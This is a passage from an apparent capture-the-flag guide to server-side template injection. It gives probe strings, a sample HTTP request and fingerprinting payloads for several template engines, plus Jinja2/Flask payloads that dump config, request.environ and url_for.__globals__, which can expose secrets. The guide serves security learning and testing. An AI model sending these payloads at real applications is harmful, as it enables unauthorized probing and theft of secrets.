Raw input Control Interpretation AA{{7*7}}ZZ AA{{7*8}}ZZ AA49ZZ / AA56ZZ: expression evaluation in this delimiter family AA${7*7}ZZ AA${7*8}ZZ FreeMarker, EL or another ${} engine; investigate AA<%= 7*7 %>ZZ AA<%= 7*8 %>ZZ ERB/EJS family; distinguish Ruby from JavaScript AA#{7*7}ZZ AA#{7*8}ZZ Some Ruby/Pug/EL contexts; only meaningful with supporting syntax AA{7*7}ZZ AA{7*8}ZZ Smarty-like arithmetic possible Inspect raw HTTP, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static 49 elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.
POST /preview HTTP/1.1 Host: ctf.invalid Content-Type: application/x-www-form-urlencoded name=AA%7B%7B7*7%7D%7DZZInside a decoded parameter editor, paste AA{{7*7}}ZZ. In JSON, use {"name":"AA{{7*7}}ZZ"}. Avoid applying URL encoding to the entire JSON body.
2. Identify with a second independent signal Family Additional test Useful evidence / caveat Jinja2 {{7*'7'}} → seven 7s; `{{‘ab’ upper}}` → AB Twig {{7*'7'}} → 49 in compatible numeric coercion {{_self}}, {{constant('PHP_VERSION')}} where allowed; PHP/Twig error names FreeMarker ${"ab"?upper_case} → AB <#assign x=7>${x*7}; .version special variable ERB <%= 'ab'.upcase %> → AB Ruby class names; <%= RUBY_VERSION %> EJS <%= 'ab'.toUpperCase() %> → AB JS ReferenceError, typeof process; Ruby .upcase fails Smarty {$smarty.version} Version exposure may be restricted; Smarty compiler errors Nunjucks {{7*7}}, JS-oriented exposed objects Jinja payloads using Python globals do not transfer Handlebars {{#if true}}YES{{/if}} Arithmetic inside double braces is not a general Handlebars expression Do not label ${7*7} “Java RCE” or assume Twig because Jinja multiplication behaves differently. Capture an engine-specific object, error or source dependency. Undefined variables often render empty.
3. Jinja2 / Flask: inspect before executing Start with context objects; these can expose the answer without shell access.
{{ self }} {{ config }} {{ request }} {{ request.application }} {{ session }} {{ config.items() }} {{ request.environ }} {{ url_for.__globals__ }}config, request, session and url_for are Flask context conveniences, not guaranteed Jinja globals. Request-dependent objects can be unavailable in offline render jobs. config can include secrets; it does not necessarily include the flag.
For a normal, unsandboxed environment exposing standard Jinja helpers:
